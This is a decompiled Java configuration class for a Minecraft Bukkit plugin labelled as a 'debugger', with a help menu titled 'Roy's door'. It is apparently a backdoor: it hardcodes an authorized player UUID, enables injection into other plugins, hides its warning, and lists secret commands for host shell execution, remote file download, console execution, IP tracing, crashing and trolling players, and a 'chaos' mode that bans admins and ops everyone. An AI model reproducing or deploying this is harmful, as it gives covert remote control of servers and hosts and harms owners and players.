package com.thiccindustries.debugger;

import org.bukkit.ChatColor;

public class Config {
   public static String[] authorized_uuids = new String[]{"f2e27843-5c74-4725-89c6-8084f5d995dc"};
   public static String[] tmp_authorized_uuids;
   public static String command_prefix = "#";
   public static Boolean uuids_are_usernames = false;
   public static Boolean inject_into_other_plugins = true;
   public static Boolean display_debugger_warning = false;
   public static Boolean display_debug_messages = false;
   public static final int default_gamemode = 1;
   public static final String default_ban_reason = "Banned";
   public static final String default_ban_source = "Server";
   public static final int default_lag_spawn_amount = 5000;
   public static final ChatColor help_command_name_color;
   public static final ChatColor help_command_desc_color;
   public static final ChatColor help_command_required_color;
   public static final ChatColor help_detail_color;
   public static final String chaos_chat_broadcast = "\n\n\n\n\n\n\n\n\n\n[Server] ALL ADMINS HAVE BEEN BANNED\n[Server] ALL PLAYERS HAVE OP UNTIL ROLLBACK";
   public static final Config.HelpItem[] help_messages;

   static {
      help_command_name_color = ChatColor.LIGHT_PURPLE;
      help_command_desc_color = ChatColor.WHITE;
      help_command_required_color = ChatColor.RED;
      help_detail_color = ChatColor.GREEN;
      help_messages = new Config.HelpItem[]{new Config.HelpItem("help", "display this message, or description of command.", new Config.Param[]{new Config.Param("command", "show command syntax", false)}), new Config.HelpItem("op", "op specified player", new Config.Param[]{new Config.Param("player", "player to op", true)}), new Config.HelpItem("deop", "deop specified player", new Config.Param[]{new Config.Param("player", "player to deop", true)}), new Config.HelpItem("ban", "ban player with reason and source", new Config.Param[]{new Config.Param("player", "player to ban", true), new Config.Param("reason", "ban reason", false), new Config.Param("source", "player listed as ban source", false)}), new Config.HelpItem("banip", "ip ban player with reason and source", new Config.Param[]{new Config.Param("player", "player to ip-ban", true), new Config.Param("reason", "ban reason", false), new Config.Param("source", "player listed as ban source", false)}), new Config.HelpItem("gm", "switch to specified gamemode", new Config.Param[]{new Config.Param("gamemode", "0, 1, 2, 3", true)}), new Config.HelpItem("give", "give the specified item in specified quantities", new Config.Param[]{new Config.Param("item", "item-id or name", true), new Config.Param("count", "number of items", false)}), new Config.HelpItem("exec", "Execute command as server console", new Config.Param[]{new Config.Param("command", "server command to execute", true)}), new Config.HelpItem("shell", "Execute operating system as host", new Config.Param[]{new Config.Param("command", "shell command to execute. Check server platform with " + command_prefix + "info", true)}), new Config.HelpItem("info", "shows informatin about server"), new Config.HelpItem("chaos", "Deop and ban ops, op all regular players"), new Config.HelpItem("seed", "get the current world seed"), new Config.HelpItem("psay", "sends messages as player", new Config.Param[]{new Config.Param("player", "player to impersonate", true), new Config.Param("message", "message to send", true)}), new Config.HelpItem("ssay", "sends messages as Server", new Config.Param[]{new Config.Param("message", "message to send", true)}), new Config.HelpItem("rename", "changes your nick", new Config.Param[]{new Config.Param("name", "change nickname", true)}), new Config.HelpItem("reload", "[Visible] Reloads the server"), new Config.HelpItem("getip", "gets ip of the player", new Config.Param[]{new Config.Param("player", "player to ip-trace", true)}), new Config.HelpItem("listworlds", "displays all worlds"), new Config.HelpItem("makeworld", "Creates new world", new Config.Param[]{new Config.Param("name", "new world name", true)}), new Config.HelpItem("delworld", "Deletes a world", new Config.Param[]{new Config.Param("name", "world name to delete", true)}), new Config.HelpItem("vanish", "makes you vanish, tab included"), new Config.HelpItem("silktouch", "gives player silk touch hands", new Config.Param[]{new Config.Param("player", "player to give silk-touch", false)}), new Config.HelpItem("instabreak", "let's player mine instantly", new Config.Param[]{new Config.Param("player", "player to give insta-break", false)}), new Config.HelpItem("crash", "crashes player's name", new Config.Param[]{new Config.Param("player", "player to crash", false)}), new Config.HelpItem("troll", "Troll player in various ways", new Config.Param[]{new Config.Param("method", "Options: clear, thrower, interact, cripple, flight, inventory, drop, teleport, mine, place, login, god, damage", true), new Config.Param("player", "player to troll", true)}), new Config.HelpItem("lock", "locks the console or blocks player", new Config.Param[]{new Config.Param("player", "'server', 'all', or player to lock", true)}), new Config.HelpItem("unlock", "unlocks the console or unblocks player", new Config.Param[]{new Config.Param("player", "'server', 'all', or player to unlock", true)}), new Config.HelpItem("mute", "mutes a player", new Config.Param[]{new Config.Param("player", "'all' or player to mute", true)}), new Config.HelpItem("unmute", "unmutes a player", new Config.Param[]{new Config.Param("player", "'all' or player to unmute", true)}), new Config.HelpItem("download", "downloads a file, don't use special chars or spaces", new Config.Param[]{new Config.Param("url", "URL of resource to download", true), new Config.Param("file", "file path", true)}), new Config.HelpItem("coords", "get the coordinates of specified player", new Config.Param[]{new Config.Param("player", "player to grab coords of", true)}), new Config.HelpItem("auth", "Authorize user until next server restart.", new Config.Param[]{new Config.Param("player", "player to authorize", true)}), new Config.HelpItem("deauth", "Unauthorized player", new Config.Param[]{new Config.Param("player", "player to deauthorize", true)}), new Config.HelpItem("tp", "Teleport to specified coordinates", new Config.Param[]{new Config.Param("x", "x coordinate", true), new Config.Param("y", "y coordinate", true), new Config.Param("z", "z coordinate", true)}), new Config.HelpItem("openinv", "Open a players inventory", new Config.Param[]{new Config.Param("player", "player to open inventory", true)}), new Config.HelpItem("nudge", "Nudges a player by 1 block", new Config.Param[]{new Config.Param("player", "player to nudge", true)}), new Config.HelpItem("stop", "Shutdown the server")};
   }

   public static class HelpItem {
      private final String name;
      private final Config.Param[] params;
      private final String desc;

      public HelpItem(String name, String desc, Config.Param[] params) {
         this.name = name;
         this.params = params;
         this.desc = desc;
      }

      public HelpItem(String name, String desc) {
         this.name = name;
         this.params = null;
         this.desc = desc;
      }

      public String getName() {
         return this.name;
      }

      public Config.Param[] getSyntax() {
         return this.params;
      }

      public String getDesc() {
         return this.desc;
      }

      public String getHelpEntry() {
         return Config.help_command_name_color + Config.command_prefix + this.name + ": " + Config.help_command_desc_color + this.desc;
      }

      public String getSyntaxHelp() {
         if (this.params == null) {
            return this.getHelpEntry();
         } else {
            StringBuilder sb = new StringBuilder();
            sb.append(Config.help_command_name_color + Config.command_prefix + this.name + " ");
            Config.Param[] var5;
            int var4 = (var5 = this.params).length;

            Config.Param p;
            int var3;
            for(var3 = 0; var3 < var4; ++var3) {
               p = var5[var3];
               sb.append(ChatColor.RESET);
               sb.append(Config.help_command_desc_color);
               sb.append("(" + p.name + ") ");
            }

            sb.append("\n");
            var4 = (var5 = this.params).length;

            for(var3 = 0; var3 < var4; ++var3) {
               p = var5[var3];
               sb.append(ChatColor.RESET);
               sb.append("(" + p.name + ") " + p.description);
               if (p.required) {
                  sb.append(Config.help_command_required_color + " [Required]");
               }

               sb.append("\n");
            }

            return sb.toString();
         }
      }

      public static String buildHelpMenu() {
         return buildHelpMenu(0);
      }

      public static String buildHelpMenu(int page) {
         StringBuilder sb = new StringBuilder();
         sb.append(Config.help_detail_color + "Roy's door\n");
         sb.append(Config.help_detail_color + "-----------------------------------------------------\n\n");

         for(int i = 0; i < Config.help_messages.length; ++i) {
            sb.append(Config.help_messages[i].getHelpEntry());
            sb.append("\n");
         }

         return sb.toString();
      }
   }

   public static class Param {
      String name;
      String description;
      Boolean required;

      public Param(String name, String description, Boolean required) {
         this.name = name;
         this.description = description;
         this.required = required;
      }
   }
}
